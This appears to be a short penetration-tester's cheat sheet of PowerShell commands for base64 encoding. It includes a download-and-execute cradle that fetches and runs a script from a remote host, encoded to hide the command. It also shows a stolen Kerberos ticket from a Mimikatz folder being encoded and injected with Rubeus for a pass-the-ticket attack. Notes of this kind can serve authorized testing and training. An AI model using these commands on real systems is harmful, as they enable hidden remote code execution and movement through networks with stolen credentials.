```
#As A String
$OriginalCommand = "SG9va2VkIG9uIHBob25pY3Mgd29ya2VkIGZvciBtZQo=" ;
[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($OriginalCommand));
[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($OriginalCommand)) | Out-File -Encoding "ASCII" base64_out.txt;
```

```
$OriginalCommand = "iex (New-Object Net.WebClient).DownloadString('http://10.8.0.166:80/download/file.ps1')"
[System.Convert]::ToBase64String([System.Text.Encoding]::unicode.GetBytes($OriginalCommand))
```

```
#Decode
[System.Text.Encoding]::unicode.GetString([System.Convert]::FromBase64String(""))
```

### Convert this ticket to a base64 encoded
```
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\Commando\Desktop\Mimikatz_x64\zps.kirbi"))
Rubeus ptt /ticket:[...snip...]
```
